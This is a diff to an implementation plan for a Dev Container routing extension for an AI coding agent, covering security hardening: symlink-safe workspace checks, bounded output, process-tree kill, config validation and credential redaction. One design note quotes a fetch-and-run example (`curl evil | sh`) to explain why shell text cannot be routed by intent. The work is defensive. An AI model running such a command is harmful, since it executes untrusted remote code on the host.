@@ -18,9 +18,9 @@ phases:
   - { n: 6, title: "Pi extension integration and dual execution interfaces", files: [extensions/index.ts, src/tools.ts, src/tool-output.ts, src/commands.ts, src/bash-router.ts, tests/unit/bash-router.test.ts, tests/unit/tools.test.ts, tests/unit/commands.test.ts, tests/unit/user-bash.test.ts, tests/unit/tool-output.test.ts], depends_on: [1, 2, 3, 4, 5] }
   - { n: 7, title: "Package quality gates and real multi-workspace integration", files: [tests/fixtures/project-a/.devcontainer/devcontainer.json, tests/fixtures/project-b/.devcontainer/devcontainer.json, tests/integration/devcontainer-manager.integration.test.ts, tests/e2e/multi-workspace.e2e.test.ts, tests/package-smoke.test.ts, scripts/verify-package.mjs, scripts/smoke-pi-package.mjs, .github/workflows/ci.yml, .github/workflows/integration.yml, .github/workflows/release.yml], depends_on: [1, 2, 3, 4, 5, 6] }
   - { n: 8, title: "Operator-facing documentation and release contract", files: [README.md, docs/installation.md, docs/configuration.md, docs/security.md, docs/compatibility.md, examples/pi-devcontainer-manager.settings.json, CHANGELOG.md, LICENSE], depends_on: [1, 2, 3, 4, 5, 6, 7] }
-last_updated: 2026-09-07T14:45:00+0800
+last_updated: 2026-09-11T15:08:45+0800
 last_updated_by: geebytes
-last_updated_note: "Routing-guidance hardening (2026-09-07): bash tool registration now overrides Pi built-in snippet/guidelines (which describe a HOST shell incl. PI_* inspection) with routed semantics — bash runs INSIDE the selected DevContainer, PI_* never exposed, prefer host file tools for reading, host administration via devcontainer_host_exec, /devcontainer up when target-stopped; devcontainer_exec/host_exec promptGuidelines expanded with container-vs-host routing criteria; new tools.test assertions pin the guidance; README gains a routing-guidance bullet. Prior: Decision (2026-09-07): container-mode file-tool routing increment built then reverted per the environment-related-only principle: bind-mount workspace files are the same file host- and container-side, so only execution-shaped ops (bash/!/!!/devcontainer_exec) are environment-sensitive and route; file tools stay host-native. See trailing Follow-up for rationale + ffind/ffgrep boundary note. Prior: Security fix (2026-09-07): user_bash now fails closed via resolveUserBash — full { result } replacement when runtime uninitialized (returning undefined or throwing both let Pi fall through to HOST local bash); added tests/unit/user-bash.test.ts. Prior note: Feature follow-up (2026-09-07): added empty-selection auto-default — ExecutionService gains an optional `autoSelect` hook invoked before `bind()` only when the target store is `none`; extensions/index.ts wires it to default-select the session-cwd workspace on an exact-realpath match (config-only/stopped → `selected-stopped`, so first exec fails closed with `target-stopped` and prompts `/devcontainer up`; never auto-starts; explicit `/devcontainer use` always wins; `list`/`status` unchanged). Code fences re-synced byte-for-byte (execution-service.ts, execution-service.test.ts, extensions/index.ts, README.md, docs/configuration.md, docs/security.md); Phase 5 service-SC + Phase 6 manual items updated; operator docs now describe the auto-select default (README selects-bullet, configuration routeMode row, security no-silent-host-fallback invariant); 3 new service tests; 163 deterministic tests + real-Pi e2e pass."
+last_updated_note: "Full audit remediation (2026-09-11): five-lens read-only audit (execution architecture, config/lifecycle, test coverage, adversarial security, Pi hook integration) recorded in .rpiv/artifacts/reviews/ + routing redesign design doc; ALL findings fixed in commit 03f0641. Central decision (H1): the uncommitted command-level dual-routing experiment was REMOVED rather than patched, because shell text is a program not an intent (`git status; curl evil | sh` classifies as git then runs entirely on the host) — routing is now enforced surfaces (bash/!/!!/devcontainer_exec = container; devcontainer_host_exec = explicit, policy-gated host) + per-turn execution-context facts injected into the system prompt (target, workspaceFolder/workspaceMount mapping, surface rules) + structured guards (host_exec refuses an argv targeting a container-only path; built-in powershell blocked via tool_call while a target is selected). Explicit bash `target` param was considered and rejected. Also fixed: H2 realpath workspace containment (symlink escape); H3 stdout/stderr each bounded by maxOutputBytes with truthful truncated; H4 container exec requires request workspace = bound target workspace and sends the bound workspace to the CLI; H5/M4 selection reconciled on restore/list/after up; H6/M8 dist rebuilt + packed-tarball smoke asserts ITS dist + publish waits on packed smoke; M1 registry exposes all candidates and flags ambiguity (Docker order never picks); M2 all allowlisted env vars forwarded (CLI yargs accumulates repeated --remote-env; old single-valued note was wrong); M3/M7/D3 logs policy-checked and audited + denied attempts and up/build/lifecycle failures audited; M5 host timeout capped by maxTimeoutSeconds; M6 nested config validation with named errors; M9 credential redaction (auth schemes, secret flags, URL userinfo); L2 JSONC-tolerant devcontainer parsing; L3 audit.enabled/audit.directory honored; D1 process-group kill on timeout/cancel; D2 unimplemented routeMode rejected at load. New files: src/execution-context.ts, vitest.config.ts, tests/unit/{execution-context,policy-hardening,container-path-guard}.test.ts. All 59 plan fences re-synced byte-for-byte (22 had drifted, incl. README/docs drift predating this change). 215 unit + 11 integration/package + 5 e2e pass; typecheck/build/verify-package/packed-smoke clean. Prior: Routing-guidance hardening (2026-09-07): bash tool registration now overrides Pi built-in snippet/guidelines (which describe a HOST shell incl. PI_* inspection) with routed semantics — bash runs INSIDE the selected DevContainer, PI_* never exposed, prefer host file tools for reading, host administration via devcontainer_host_exec, /devcontainer up when target-stopped; devcontainer_exec/host_exec promptGuidelines expanded with container-vs-host routing criteria; new tools.test assertions pin the guidance; README gains a routing-guidance bullet. Prior: Decision (2026-09-07): container-mode file-tool routing increment built then reverted per the environment-related-only principle: bind-mount workspace files are the same file host- and container-side, so only execution-shaped ops (bash/!/!!/devcontainer_exec) are environment-sensitive and route; file tools stay host-native. See trailing Follow-up for rationale + ffind/ffgrep boundary note. Prior: Security fix (2026-09-07): user_bash now fails closed via resolveUserBash — full { result } replacement when runtime uninitialized (returning undefined or throwing both let Pi fall through to HOST local bash); added tests/unit/user-bash.test.ts. Prior note: Feature follow-up (2026-09-07): added empty-selection auto-default — ExecutionService gains an optional `autoSelect` hook invoked before `bind()` only when the target store is `none`; extensions/index.ts wires it to default-select the session-cwd workspace on an exact-realpath match (config-only/stopped → `selected-stopped`, so first exec fails closed with `target-stopped` and prompts `/devcontainer up`; never auto-starts; explicit `/devcontainer use` always wins; `list`/`status` unchanged). Code fences re-synced byte-for-byte (execution-service.ts, execution-service.test.ts, extensions/index.ts, README.md, docs/configuration.md, docs/security.md); Phase 5 service-SC + Phase 6 manual items updated; operator docs now describe the auto-select default (README selects-bullet, configuration routeMode row, security no-silent-host-fallback invariant); 3 new service tests; 163 deterministic tests + real-Pi e2e pass."
 ---
 
 # pi-devcontainer-manager Implementation Plan
@@ -180,13 +180,28 @@ export interface DiscoveredProject {
   readonly configKind: DevcontainerConfigKind;
 }
 
+/** One discovered container for a workspace (identity + observed state). */
+export interface RegistryCandidate {
+  readonly id: string;
+  readonly state: ContainerState;
+}
+
 export interface RegistryEntry {
   readonly workspacePath: string;
   readonly configPath: string;
   readonly configKind: DevcontainerConfigKind;
   readonly discoveredFrom: "host-config" | "docker-label" | "both";
+  /** Primary candidate id (first discovered); see `containerCandidates`. */
   readonly containerId?: string;
   readonly containerState?: ContainerState;
+  /** ALL containers discovered for this workspace (never collapsed away). */
+  readonly containerCandidates?: readonly RegistryCandidate[];
+  /**
+   * True when MORE THAN ONE running container matches this workspace. Such a
+   * target must never be auto-selected by Docker result order; the operator
+   * picks an explicit candidate id.
+   */
+  readonly ambiguous?: boolean;
 }
 
 export interface DiscoveryConfig {
@@ -449,6 +464,11 @@ function validateConfig(config: ManagerConfig, source: string): void {
   if (config.routeMode !== undefined && !ROUTE_MODES.has(config.routeMode)) {
     throw new Error(`${source} configuration has an invalid routeMode`);
   }
+  if (config.routeMode !== undefined && config.routeMode !== "container-required") {
+    throw new Error(
+      `${source} configuration routeMode '${config.routeMode}' is not implemented; only "container-required" is supported in v1`,
+    );
+  }
   for (const [name, value] of [["allowedWorkspaceRoots", config.allowedWorkspaceRoots], ["environmentAllowlist", config.environmentAllowlist]] as const) {
     if (value !== undefined && (!Array.isArray(value) || value.some((item) => typeof item !== "string" || item.length === 0))) {
       throw new Error(`${source} configuration ${name} must be a non-empty string array`);
@@ -467,6 +487,33 @@ function validateConfig(config: ManagerConfig, source: string): void {
   }
   if (config.audit?.commandCapture !== undefined && !CAPTURE_MODES.has(config.audit.commandCapture)) {
     throw new Error(`${source} configuration audit.commandCapture is invalid`);
+  }
+  if (config.audit?.enabled !== undefined && typeof config.audit.enabled !== "boolean") {
+    throw new Error(`${source} configuration audit.enabled must be a boolean`);
+  }
+  if (config.audit?.directory !== undefined && (typeof config.audit.directory !== "string" || config.audit.directory.length === 0)) {
+    throw new Error(`${source} configuration audit.directory must be a non-empty string`);
+  }
+  if (
+    config.discovery?.excludedDirectories !== undefined &&
+    (!Array.isArray(config.discovery.excludedDirectories) ||
+      config.discovery.excludedDirectories.some((item) => typeof item !== "string" || item.length === 0))
+  ) {
+    throw new Error(`${source} configuration discovery.excludedDirectories must be an array of non-empty strings`);
+  }
+  for (const [name, value] of [["dockerPath", config.dockerPath], ["devcontainerPath", config.devcontainerPath]] as const) {
+    if (value !== undefined && (typeof value !== "string" || value.length === 0)) {
+      throw new Error(`${source} configuration ${name} must be a non-empty string`);
+    }
+  }
+  for (const [name, value] of [
+    ["destructive.allowStop", config.destructive?.allowStop],
+    ["destructive.allowRemove", config.destructive?.allowRemove],
+    ["hostExecution.allow", config.hostExecution?.allow],
+  ] as const) {
+    if (value !== undefined && typeof value !== "boolean") {
+      throw new Error(`${source} configuration ${name} must be a boolean`);
+    }
   }
 }
 
@@ -501,6 +548,7 @@ function freezeConfig(value: {
 **Changes**: `evaluatePolicy` → frozen snapshot with the four denials; `isWorkspaceAllowed`; `isEnvironmentAllowed` (`PI_*` + secret-pattern names denied); `buildChildEnvironment`; `commandFingerprint` (SHA-256); `redactText`.
 
 ```ts
+import { realpathSync } from "node:fs";
 import { isAbsolute, relative, resolve } from "node:path";
 import { createHash } from "node:crypto";
 import type { EffectiveConfig, OperationPolicySnapshot, PolicyInput } from "./types.js";
@@ -543,13 +591,34 @@ export function evaluatePolicy(
   });
 }
 
+/**
+ * Filesystem-identity-aware workspace containment.
+ *
+ * Containment is checked on `realpath`-resolved paths, not lexical ones: a
+ * symlink created beneath an allowed root that points outside it must not pass
+ * (`/allowed/link -> /outside`). Paths that do not exist fall back to their
+ * resolved lexical form so configuration/selection flows for not-yet-created
+ * workspaces keep working; operations that require an existing workspace still
+ * fail closed downstream when the path cannot be resolved by the CLI.
+ */
 export function isWorkspaceAllowed(workspace: string, roots: readonly string[]): boolean {
   if (!isAbsolute(workspace) || roots.length === 0) return false;
-  const candidate = resolve(workspace);
+  const candidate = canonicalForPolicy(workspace);
+  const separator = process.platform === "win32" ? "\\" : "/";
   return roots.some((root) => {
-    const rel = relative(resolve(root), candidate);
-    return rel === "" || (!rel.startsWith(`..${process.platform === "win32" ? "\\" : "/"}`) && rel !== "..");
+    const base = canonicalForPolicy(root);
+    const rel = relative(base, candidate);
+    return rel === "" || (!rel.startsWith(`..${separator}`) && rel !== "..");
   });
+}
+
+/** realpath when the path exists, else the resolved lexical path. */
+function canonicalForPolicy(path: string): string {
+  try {
+    return realpathSync(path);
+  } catch {
+    return resolve(path);
+  }
 }
 
 export function isEnvironmentAllowed(name: string, allowlist: readonly string[]): boolean {
@@ -578,8 +647,36 @@ export function commandFingerprint(parts: readonly string[]): string {
   return createHash("sha256").update(parts.join("\u0000"), "utf8").digest("hex");
 }
 
+/**
+ * Best-effort credential scrubbing for audit command text.
+ *
+ * This is deliberately conservative and layered, but it is NOT a guarantee:
+ * `audit.commandCapture` defaults to `fingerprint-only`, and plaintext capture
+ * should be treated as sensitive even after redaction. Covered here:
+ *  - `Bearer`/`Basic`/`Token` authentication schemes (header values)
+ *  - `key: value` / `key=value` for secret-looking names (quoted or bare)
+ *  - `--secret-flag value` / `--secret-flag=value`
+ *  - credentials embedded in URLs (`scheme://user:pass@host`)
+ */
+const SECRET_KEY = "(?:api[_-]?key|access[_-]?key|private[_-]?key|token|secret|password|passwd|credential|credentials|authorization|auth)";
+
 export function redactText(text: string): string {
-  return text.replace(/(api[_-]?key|token|secret|password|authorization)\s*[=:]\s*[^\s]+/gi, "$1=[REDACTED]");
+  let out = text;
+  // 1. Auth schemes: "Bearer <token>" / "Basic <b64>" / "Token <t>".
+  out = out.replace(/\b(Bearer|Basic|Token)\s+[A-Za-z0-9\-._~+/=]+/gi, "$1 [REDACTED]");
+  // 2. key: value / key=value (quoted or bare token).
+  out = out.replace(
+    new RegExp(`(${SECRET_KEY})(\\s*[=:]\\s*)("[^"]*"|'[^']*'|[^\\s"']+)`, "gi"),
+    "$1$2[REDACTED]",
+  );
+  // 3. --secret-flag value / --secret-flag=value.
+  out = out.replace(
+    new RegExp(`(--?${SECRET_KEY})(\\s*=\\s*|\\s+)("[^"]*"|'[^']*'|[^\\s"']+)`, "gi"),
+    "$1$2[REDACTED]",
+  );
+  // 4. Credentials embedded in URLs: scheme://user:pass@host.
+  out = out.replace(/(\w+:\/\/)[^/\s:@]+:[^/\s@]+@/g, "$1[REDACTED]@");
+  return out;
 }
 ```
 
@@ -606,9 +703,14 @@ export function defaultAuditDirectory(platform: NodeJS.Platform = process.platfo
 }
 
 export class JsonlAuditWriter implements AuditWriter {
-  public constructor(private readonly directory: string, private readonly retentionDays = 90) {}
-
+  public constructor(
+    private readonly directory: string,
+    private readonly retentionDays = 90,
+    /** When false, records are accepted but never persisted (audit disabled). */
+    private readonly enabled = true,
+  ) {}
   write(record: AuditRecord): void {
+    if (!this.enabled) return;
     mkdirSync(this.directory, { recursive: true, mode: 0o700 });
     const file = join(this.directory, `${record.at.slice(0, 10)}.jsonl`);
     const safe = {
@@ -625,6 +727,7 @@ export class JsonlAuditWriter implements AuditWriter {
   }
 
   prune(now: Date): void {
+    if (!this.enabled) return;
     if (!existsSync(this.directory)) return;
     const cutoff = now.getTime() - this.retentionDays * 24 * 60 * 60 * 1000;
     for (const entry of readdirSync(this.directory, { withFileTypes: true })) {
@@ -679,6 +782,16 @@ describe("compileConfig", () => {
     expect(() => compileConfig({ routeMode: "unsafe" as never })).toThrow("routeMode");
     expect(() => compileConfig({ discovery: { maxDepth: 0 } })).toThrow("maxDepth");
     expect(() => compileConfig({ audit: { commandCapture: "plaintext" as never } })).toThrow("commandCapture");
+  });
+
+  it("rejects mistyped nested configuration instead of failing later", () => {
+    expect(() => compileConfig({ discovery: { excludedDirectories: "node_modules" as never } })).toThrow("excludedDirectories");
+    expect(() => compileConfig({ dockerPath: "" })).toThrow("dockerPath");
+    expect(() => compileConfig({ devcontainerPath: 42 as never })).toThrow("devcontainerPath");
+    expect(() => compileConfig({ audit: { enabled: "yes" as never } })).toThrow("audit.enabled");
+    expect(() => compileConfig({ audit: { directory: "" } })).toThrow("audit.directory");
+    expect(() => compileConfig({ destructive: { allowStop: "yes" as never } })).toThrow("destructive.allowStop");
+    expect(() => compileConfig({ hostExecution: { allow: "yes" as never } })).toThrow("hostExecution.allow");
   });
 });
 ```
@@ -898,6 +1011,30 @@ export interface ProcessRunner {
 const DEFAULT_MAX_OUTPUT_BYTES = 50 * 1024;
 
 export type SpawnedChild = ChildProcessByStdio<null, import("node:stream").Readable, import("node:stream").Readable>;
+
+/**
+ * Kill the child AND its descendant processes.
+ *
+ * Children are spawned as their own process group (`detached: true` on POSIX),
+ * so a shell/CLI that forks background work cannot outlive a timeout or
+ * cancellation. Without a process group, `child.kill()` only signals the
+ * immediate process and descendants keep running while the operation is
+ * already reported as cancelled. Windows has no process-group signalling via
+ * negative pid; fall back to a direct kill there.
+ */
+export function killProcessTree(child: SpawnedChild): void {
+  const pid = child.pid;
+  if (pid !== undefined && process.platform !== "win32") {
+    try {
+      process.kill(-pid, "SIGKILL");
+      return;
+    } catch {
+      /* group already gone or not permitted; fall through to direct kill */
+    }
+  }
+  child.kill("SIGKILL");
+}
+
 export class NodeProcessRunner implements ProcessRunner {
   public async exec(
     file: string,
@@ -916,6 +1053,8 @@ export class NodeProcessRunner implements ProcessRunner {
         env: { ...options.env },
         shell: false,
         stdio: ["ignore", "pipe", "pipe"],
+        // Own process group so timeout/cancel can terminate descendants too.
+        detached: process.platform !== "win32",
       });
     } catch (error) {
       throw toSpawnError(file, error);
@@ -924,7 +1063,11 @@ export class NodeProcessRunner implements ProcessRunner {
     options.onSpawn?.(child);
 
     return await new Promise<ProcessResult>((resolve, reject) => {
+      // Bounded output: each stream is independently capped at `maxOutput`, so
+      // captured memory is at most 2x the configured limit and NEITHER stream
+      // can exhaust the extension process. `truncated` reflects either stream.
       let stdoutBytes = 0;
+      let stderrBytes = 0;
       let truncated = false;
       let timer: NodeJS.Timeout | undefined;
       let settled = false;
@@ -952,33 +1095,47 @@ export class NodeProcessRunner implements ProcessRunner {
       });
 
       child.stdout.on("data", (chunk: Buffer) => {
-        if (stdoutBytes < maxOutput) {
-          const remaining = maxOutput - stdoutBytes;
-          if (chunk.length > remaining) {
-            stdout(chunk.subarray(0, remaining));
-            stdoutBytes = maxOutput;
-            truncated = true;
-          } else {
-            stdout(chunk);
-            stdoutBytes += chunk.length;
-          }
-        } else {
+        if (stdoutBytes >= maxOutput) {
           truncated = true;
+          return;
+        }
+        const remaining = maxOutput - stdoutBytes;
+        if (chunk.length > remaining) {
+          stdout(chunk.subarray(0, remaining));
+          stdoutBytes = maxOutput;
+          truncated = true;
+        } else {
+          stdout(chunk);
+          stdoutBytes += chunk.length;
         }
       });
 
-      child.stderr.on("data", (chunk: Buffer) => stderr(chunk));
+      child.stderr.on("data", (chunk: Buffer) => {
+        if (stderrBytes >= maxOutput) {
+          truncated = true;
+          return;
+        }
+        const remaining = maxOutput - stderrBytes;
+        if (chunk.length > remaining) {
+          stderr(chunk.subarray(0, remaining));
+          stderrBytes = maxOutput;
+          truncated = true;
+        } else {
+          stderr(chunk);
+          stderrBytes += chunk.length;
+        }
+      });
 
       const onAbort = () => {
         if (settled) return;
         cleanup();
-        child.kill("SIGKILL");
+        killProcessTree(child);
         fail(new RuntimeError({ kind: "cancelled", message: "Process cancelled" }));
       };
 
       if (options.signal !== undefined) {
         if (options.signal.aborted) {
-          child.kill("SIGKILL");
+          killProcessTree(child);
           fail(new RuntimeError({ kind: "cancelled", message: "Process cancelled" }));
           return;
         }
@@ -988,7 +1145,7 @@ export class NodeProcessRunner implements ProcessRunner {
       if (options.timeoutMs !== undefined) {
         timer = setTimeout(() => {
           if (settled) return;
-          child.kill("SIGKILL");
+          killProcessTree(child);
           fail(new RuntimeError({ kind: "timeout", message: `Process timed out after ${options.timeoutMs}ms` }));
         }, options.timeoutMs);
       }
@@ -1280,6 +1437,38 @@ describe("NodeProcessRunner", () => {
       onStderr: (chunk) => chunks.push(chunk),
     });
     expect(Buffer.concat(chunks).toString("utf8")).toBe("boom");
+  });
+
+  it("bounds stderr at maxOutputBytes and reports truncated", async () => {
+    const chunks: Buffer[] = [];
+    const result = await runner.exec("node", ["-e", "process.stderr.write('y'.repeat(100))"], {
+      cwd: process.cwd(),
+      env: { PATH: process.env.PATH ?? "" },
+      maxOutputBytes: 10,
+      onStderr: (chunk) => chunks.push(chunk),
+    });
+    expect(result.exitCode).toBe(0);
+    expect(result.truncated).toBe(true);
+    expect(Buffer.concat(chunks).length).toBeLessThanOrEqual(10);
+  });
+
+  it("bounds stdout and stderr independently", async () => {
+    const out: Buffer[] = [];
+    const err: Buffer[] = [];
+    const result = await runner.exec(
+      "node",
+      ["-e", "process.stdout.write('a'.repeat(50)); process.stderr.write('b'.repeat(50))"],
+      {
+        cwd: process.cwd(),
+        env: { PATH: process.env.PATH ?? "" },
+        maxOutputBytes: 10,
+        onData: (chunk) => out.push(chunk),
+        onStderr: (chunk) => err.push(chunk),
+      },
+    );
+    expect(result.truncated).toBe(true);
+    expect(Buffer.concat(out).length).toBeLessThanOrEqual(10);
+    expect(Buffer.concat(err).length).toBeLessThanOrEqual(10);
   });
 
   it("reports child termination with null exit code and the signal", async () => {
@@ -2810,11 +2999,19 @@ export function buildWorkspaceRegistry(input: DiscoveryInput): RegistryResult {
     }
     const first = dockerList[0];
     if (first === undefined) continue;
+    // Expose EVERY candidate and fail closed when more than one is running,
+    // so Docker result order never silently decides the target.
+    const candidates = dockerList
+      .filter((c) => c.id !== "")
+      .map((c) => ({ id: c.id, state: mapContainerState(c.state) ?? ("unknown" as const) }));
+    const runningCount = candidates.filter((c) => c.state === "running").length;
     entries.push({
       ...hostEntry,
       discoveredFrom: "both",
       ...(first.id !== "" ? { containerId: first.id } : {}),
       ...containerStateField(first.state),
+      containerCandidates: candidates,
+      ...(runningCount > 1 ? { ambiguous: true } : {}),
     });
   }
 
@@ -2852,7 +3049,6 @@ function containerStateField(state: string | undefined): { containerState?: Cont
 function errorMessage(error: unknown): string {
   return error instanceof Error ? error.message : String(error);
 }
-
 ```
 
 #### 2. tests/unit/host-discovery.test.ts (NEW)
@@ -3181,6 +3377,7 @@ describe("buildWorkspaceRegistry", () => {
         discoveredFrom: "both",
         containerId: "aa11",
         containerState: "running",
+        containerCandidates: [{ id: "aa11", state: "running" }],
       },
     ]);
     expect(result.configOnly).toEqual([]);
@@ -3234,9 +3431,38 @@ describe("buildWorkspaceRegistry", () => {
         discoveredFrom: "both",
         containerId: "c1",
         containerState: "running",
+        containerCandidates: [{ id: "c1", state: "running" }],
       },
     ]);
     expect(result.configOnly).toEqual([]);
+  });
+
+  it("flags ambiguity when more than one container for a workspace is running", () => {
+    const fs = fsTree();
+    addFile(fs, "/work/a/.devcontainer/devcontainer.json");
+    const docker = [
+      dockerCandidate({ id: "aa11", workspaceKey: "/work/a", state: "running" }),
+      dockerCandidate({ id: "aa12", workspaceKey: "/work/a", state: "running" }),
+    ];
+    const result = registry(fs, docker);
+    expect(result.entries).toHaveLength(1);
+    expect(result.entries[0]?.ambiguous).toBe(true);
+    expect(result.entries[0]?.containerCandidates).toEqual([
+      { id: "aa11", state: "running" },
+      { id: "aa12", state: "running" },
+    ]);
+  });
+
+  it("does not flag ambiguity when only one container is running", () => {
+    const fs = fsTree();
+    addFile(fs, "/work/a/.devcontainer/devcontainer.json");
+    const docker = [
+      dockerCandidate({ id: "aa11", workspaceKey: "/work/a", state: "running" }),
+      dockerCandidate({ id: "aa12", workspaceKey: "/work/a", state: "exited" }),
+    ];
+    const result = registry(fs, docker);
+    expect(result.entries[0]?.ambiguous).toBeUndefined();
+    expect(result.entries[0]?.containerCandidates).toHaveLength(2);
   });
 
   it("collapses duplicate Docker labels into a single entry without duplication", () => {
@@ -3292,7 +3518,6 @@ describe("buildWorkspaceRegistry", () => {
     expect(result.entries[0]?.configKind).toBe(".devcontainer/devcontainer.json");
   });
 });
-
 ```
 
 ### Success Criteria:
@@ -3344,9 +3569,10 @@ Add the workspace-aware Dev Containers CLI adapter (`up`/`build`/`exec`), the un
  * - `build`-> `devcontainer build [--workspace-folder <ws>] [--docker-path <d>]`
  *   stdout JSON `{outcome, imageName}`; error outcome exits 1.
  * - `exec` -> `devcontainer exec --workspace-folder <ws> --container-id <id>
- *   [--remote-env N=V] -- <cmd> [args...]`; exit code is the container-side
- *   command's exit code; `--remote-env` is single-valued in 0.88.0
- *   (repeated flags collapse to the last), so at most one variable is passed.
+ *   [--remote-env N=V]... -- <cmd> [args...]`; exit code is the container-side
+ *   command's exit code; `--remote-env` may be repeated (yargs accumulates
+ *   duplicates into an array; the CLI normalizes a single value to a
+ *   one-element array), so EVERY allowlisted variable is forwarded.
  */
 import type { ProcessRunner, ProcessResult } from "./process-runner.js";
 import { RuntimeError } from "../errors.js";
@@ -3464,10 +3690,12 @@ export class NodeDevcontainerAdapter implements DevcontainerAdapter {
     const argv: string[] = ["exec", "--workspace-folder", workspace, "--container-id", containerId];
     if (options.dockerPath !== undefined) argv.push("--docker-path", options.dockerPath);
     const remoteEnv = options.remoteEnv ?? {};
-    // CLI 0.88.0: --remote-env is single-valued (repeated flags last-win).
-    const entries = Object.entries(remoteEnv);
-    if (entries.length >= 1) {
-      argv.push("--remote-env", `${entries[0]![0]}=${entries[0]![1]}`);
+    // CLI 0.88.0 accepts repeated `--remote-env name=value` flags: yargs
+    // accumulates duplicate flags into an array and the CLI normalizes a single
+    // value to a one-element array. Forward EVERY allowlisted variable; never
+    // silently drop all but the first.
+    for (const [name, value] of Object.entries(remoteEnv)) {
+      argv.push("--remote-env", `${name}=${value}`);
     }
     argv.push("--", cmd, ...args);
 
@@ -4041,6 +4269,28 @@ export class ExecutionService {
       await this.options.autoSelect?.(request.workspace);
     }
     const ctx = this.options.targetStore.bind();
+    // Target/workspace integrity: the Dev Containers CLI would receive
+    // `--workspace-folder <request.workspace>` while the container id comes from
+    // the bound target. If those disagree, policy was evaluated for one
+    // workspace while execution targets another's container. Require the request
+    // workspace to be the bound target workspace (or a path below it), and always
+    // send the TARGET workspace to the CLI so authorization scope, target, and
+    // audit agree.
+    const requestKey = canonicalWorkspaceKey(request.workspace);
+    const targetKey = canonicalWorkspaceKey(ctx.workspaceKey);
+    const withinTarget = requestKey === targetKey || requestKey.startsWith(targetKey === "/" ? "/" : `${targetKey}/`);
+    if (!withinTarget) {
+      this.audit(snapshot, undefined, request, {
+        exitCode: null,
+        outputTruncated: false,
+        errorSummary: "request-workspace-mismatch",
+      });
+      throw new RuntimeError({
+        kind: "policy-denied",
+        message: `Requested workspace ${request.workspace} is not the selected target workspace ${ctx.workspaceKey}.`,
+        remedy: "Run /devcontainer use for the target, or run the command from the target workspace.",
+      });
+    }
     const environment = buildChildEnvironment(
       request.environment,
       snapshot.effectiveConfig.environmentAllowlist,
@@ -4050,7 +4300,7 @@ export class ExecutionService {
     let result: ExecResult;
     try {
       result = await this.options.devcontainer.exec(
-        request.workspace,
+        ctx.workspaceKey,
         ctx.candidateId,
         request.cmd,
         request.args,
@@ -4104,10 +4354,21 @@ export class ExecutionService {
       initiator: request.initiator,
       workspace: request.workspace,
     });
-    const result = await this.options.devcontainer.up(request.workspace, {
-      ...(request.dockerPath !== undefined ? { dockerPath: request.dockerPath } : {}),
-      ...(request.signal !== undefined ? { signal: request.signal } : {}),
-    });
+    let result: Awaited<ReturnType<DevcontainerAdapter["up"]>>;
+    try {
+      result = await this.options.devcontainer.up(request.workspace, {
+        ...(request.dockerPath !== undefined ? { dockerPath: request.dockerPath } : {}),
+        ...(request.signal !== undefined ? { signal: request.signal } : {}),
+      });
+    } catch (error) {
+      this.audit(snapshot, undefined, request, {
+        durationMs: Date.now() - startedAt,
+        exitCode: null,
+        outputTruncated: false,
+        errorSummary: this.asAuditError(error).message,
+      });
+      throw error;
+    }
     this.audit(snapshot, undefined, request, { durationMs: Date.now() - startedAt, exitCode: 0, outputTruncated: false }, result.containerId);
     return {
       operation: "up",
@@ -4126,12 +4387,23 @@ export class ExecutionService {
       initiator: request.initiator,
       workspace: request.workspace,
     });
-    const result = await this.options.devcontainer.build(request.workspace, {
-      ...(request.dockerPath !== undefined ? { dockerPath: request.dockerPath } : {}),
-      ...(request.noCache === true ? { noCache: true } : {}),
-      ...(request.imageName !== undefined ? { imageName: request.imageName } : {}),
-      ...(request.signal !== undefined ? { signal: request.signal } : {}),
-    });
+    let result: Awaited<ReturnType<DevcontainerAdapter["build"]>>;
+    try {
+      result = await this.options.devcontainer.build(request.workspace, {
+        ...(request.dockerPath !== undefined ? { dockerPath: request.dockerPath } : {}),
+        ...(request.noCache === true ? { noCache: true } : {}),
+        ...(request.imageName !== undefined ? { imageName: request.imageName } : {}),
+        ...(request.signal !== undefined ? { signal: request.signal } : {}),
+      });
+    } catch (error) {
+      this.audit(snapshot, undefined, request, {
+        durationMs: Date.now() - startedAt,
+        exitCode: null,
+        outputTruncated: false,
+        errorSummary: this.asAuditError(error).message,
+      });
+      throw error;
+    }
     this.audit(snapshot, undefined, request, { durationMs: Date.now() - startedAt, exitCode: 0, outputTruncated: false });
     return {
       operation: "build",
@@ -4147,14 +4419,27 @@ export class ExecutionService {
       initiator: request.initiator,
       workspace: request.workspace,
     });
-    const result = await this.options.dockerLifecycle[request.operation](
-      request.container,
-      request.confirmation,
-    );
+    const startedAt = Date.now();
+    let result: LifecycleServiceResult;
+    try {
+      result = await this.options.dockerLifecycle[request.operation](
+        request.container,
+        request.confirmation,
+      );
+    } catch (error) {
+      this.audit(snapshot, undefined, request, {
+        durationMs: Date.now() - startedAt,
+        exitCode: null,
+        outputTruncated: false,
+        errorSummary: this.asAuditError(error).message,
+      }, request.container.id);
+      throw error;
+    }
     if (result.status === "done") {
-      this.audit(snapshot, undefined, request, { exitCode: 0, outputTruncated: false }, request.container.id);
+      this.audit(snapshot, undefined, request, { durationMs: Date.now() - startedAt, exitCode: 0, outputTruncated: false }, request.container.id);
     } else {
       this.audit(snapshot, undefined, request, {
+        durationMs: Date.now() - startedAt,
         exitCode: null,
         outputTruncated: false,
         errorSummary: "confirmation required",
@@ -4163,11 +4448,70 @@ export class ExecutionService {
     return result;
   }
 
-  /** Frozen policy gate before target resolution or spawn. */
+  /**
+   * Bounded container logs, routed through the shared service so the read is
+   * policy-checked and audited like every other operation (it previously
+   * bypassed both).
+   */
+  public async logs(request: {
+    initiator: Initiator;
+    workspace: string;
+    containerId: string;
+    tail?: number;
+    signal?: AbortSignal;
+  }): Promise<{ exitCode: number | null; output: string; truncated: boolean }> {
+    const snapshot = this.authorize({
+      operation: "logs",
+      initiator: request.initiator,
+      workspace: request.workspace,
+    });
+    const startedAt = Date.now();
+    let result: Awaited<ReturnType<DockerLifecycleAdapter["logs"]>>;
+    try {
+      result = await this.options.dockerLifecycle.logs(request.containerId, {
+        ...(request.tail !== undefined ? { tail: request.tail } : {}),
+        ...(request.signal !== undefined ? { signal: request.signal } : {}),
+      });
+    } catch (error) {
+      this.audit(snapshot, undefined, { operation: "logs", initiator: request.initiator, workspace: request.workspace }, {
+        durationMs: Date.now() - startedAt,
+        exitCode: null,
+        outputTruncated: false,
+        errorSummary: this.asAuditError(error).message,
+      }, request.containerId);
+      throw error;
+    }
+    this.audit(snapshot, undefined, { operation: "logs", initiator: request.initiator, workspace: request.workspace }, {
+      durationMs: Date.now() - startedAt,
